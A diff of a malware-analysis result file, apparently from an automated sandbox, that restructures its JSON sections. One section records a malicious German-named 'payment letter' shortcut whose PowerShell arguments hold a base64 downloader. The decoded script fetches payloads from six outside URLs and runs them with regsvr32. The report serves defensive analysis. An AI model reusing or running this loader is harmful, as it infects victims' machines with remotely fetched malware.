@@ -5,7 +5,29 @@
     "sections": [
       {
         "auto_collapse": false,
-        "body": "{\"type\": \"colormap\", \"data\": {\"domain\": [0, 8], \"values\": [2.586770826545514, 2.2639798809173497, 2.921770542381683, 2.8950202411601635, 2.894846147050424, 3.7216067588810167, 3.7172141262847953, 3.7085328672945006, 3.6754117796717907, 3.730955714209397, 3.4189186153927933, 3.7472365565043018]}}",
+        "body": {
+          "data": {
+            "domain": [
+              0,
+              8
+            ],
+            "values": [
+              2.586770826545514,
+              2.2639798809173497,
+              2.921770542381683,
+              2.8950202411601635,
+              2.894846147050424,
+              3.7216067588810167,
+              3.7172141262847953,
+              3.7085328672945006,
+              3.6754117796717907,
+              3.730955714209397,
+              3.4189186153927933,
+              3.7472365565043018
+            ]
+          },
+          "type": "colormap"
+        },
         "body_config": {},
         "body_format": "GRAPH_DATA",
         "classification": "TLP:C",
@@ -18,7 +40,18 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"flags\": \"IDList, RelativePath, WorkingDir, CommandArgs, IconFile, Unicode\", \"file_attributes\": \"(none)\", \"icon_index\": 134, \"run_window\": \"Show Minimized No Activate\", \"hot_key\": \"(none)\", \"target_file_dosname\": \"powershell.exe\", \"relative_path\": \"..\\\\..\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"working_directory\": \"%cd%\", \"command_line_arguments\": \"-command Out-String -InputObject \\\"Zahlungsschreiben 2022.26.04_1035.lnk                                                                                                   \\\" | Out-Null; [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSI7JGxpbmtzPSgiaHR0cDovL2ZvY3VzbWVkaWNhLmluL2ZtbGliL0l4QkFCTWgwSTJjTE0zcXExR1Z2LyIsImh0dHA6Ly9kZW1vMzQuY2tnLmhrL3NlcnZpY2UvaGhNWnJmQzdNbm05SkQvIiwiaHR0cDovL2NvbGVnaW91bmFtdW5vLmVzL2NnaS1iaW4vRS8iLCJodHRwOi8vY2lwcm8ubXgvcHJlbnNhL3NpWlA2OXJCRm1pYkR2dVRQMUwvIiwiaHR0cDovL2ZpbG1tb2d6aXZvdGEucnMvU3ByeUFzc2V0cy9nRFIvIiwiaHR0cHM6Ly9jcmVlbW8ucGwvd3AtYWRtaW4vWktTMURjZHF1VVQ0QmI4S2IvIik7Zm9yZWFjaCAoJHUgaW4gJGxpbmtzKSB7dHJ5IHtJV1IgJHUgLU91dEZpbGUgJGVudjpURU1QL0dNT1dEVFJmSUoueHRxO1JlZ3N2cjMyLmV4ZSAkZW52OlRFTVAvR01PV0RUUmZJSi54dHE7YnJlYWt9IGNhdGNoIHsgfX0=')) > \\\"%tmp%\\\\ezMgZunnfF.ps1\\\" ; powershell -executionpolicy bypass -file \\\"%tmp%\\\\ezMgZunnfF.ps1\\\"; Remove-Item \\\"%tmp%\\\\ezMgZunnfF.ps1\\\"\", \"icon_file_name\": \"shell32.dll\"}",
+        "body": {
+          "command_line_arguments": "-command Out-String -InputObject \"Zahlungsschreiben 2022.26.04_1035.lnk                                                                                                   \" | Out-Null; [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSI7JGxpbmtzPSgiaHR0cDovL2ZvY3VzbWVkaWNhLmluL2ZtbGliL0l4QkFCTWgwSTJjTE0zcXExR1Z2LyIsImh0dHA6Ly9kZW1vMzQuY2tnLmhrL3NlcnZpY2UvaGhNWnJmQzdNbm05SkQvIiwiaHR0cDovL2NvbGVnaW91bmFtdW5vLmVzL2NnaS1iaW4vRS8iLCJodHRwOi8vY2lwcm8ubXgvcHJlbnNhL3NpWlA2OXJCRm1pYkR2dVRQMUwvIiwiaHR0cDovL2ZpbG1tb2d6aXZvdGEucnMvU3ByeUFzc2V0cy9nRFIvIiwiaHR0cHM6Ly9jcmVlbW8ucGwvd3AtYWRtaW4vWktTMURjZHF1VVQ0QmI4S2IvIik7Zm9yZWFjaCAoJHUgaW4gJGxpbmtzKSB7dHJ5IHtJV1IgJHUgLU91dEZpbGUgJGVudjpURU1QL0dNT1dEVFJmSUoueHRxO1JlZ3N2cjMyLmV4ZSAkZW52OlRFTVAvR01PV0RUUmZJSi54dHE7YnJlYWt9IGNhdGNoIHsgfX0=')) > \"%tmp%\\ezMgZunnfF.ps1\" ; powershell -executionpolicy bypass -file \"%tmp%\\ezMgZunnfF.ps1\"; Remove-Item \"%tmp%\\ezMgZunnfF.ps1\"",
+          "file_attributes": "(none)",
+          "flags": "IDList, RelativePath, WorkingDir, CommandArgs, IconFile, Unicode",
+          "hot_key": "(none)",
+          "icon_file_name": "shell32.dll",
+          "icon_index": 134,
+          "relative_path": "..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "run_window": "Show Minimized No Activate",
+          "target_file_dosname": "powershell.exe",
+          "working_directory": "%cd%"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -60,7 +93,9 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"icon_location\": \"shell32.dll\"}",
+        "body": {
+          "icon_location": "shell32.dll"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
@@ -80,7 +115,10 @@
       },
       {
         "auto_collapse": false,
-        "body": "{\"relative_path\": \"..\\\\..\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"target_file_dosname\": \"Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\"}",
+        "body": {
+          "relative_path": "..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "target_file_dosname": "Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+        },
         "body_config": {},
         "body_format": "KEY_VALUE",
         "classification": "TLP:C",
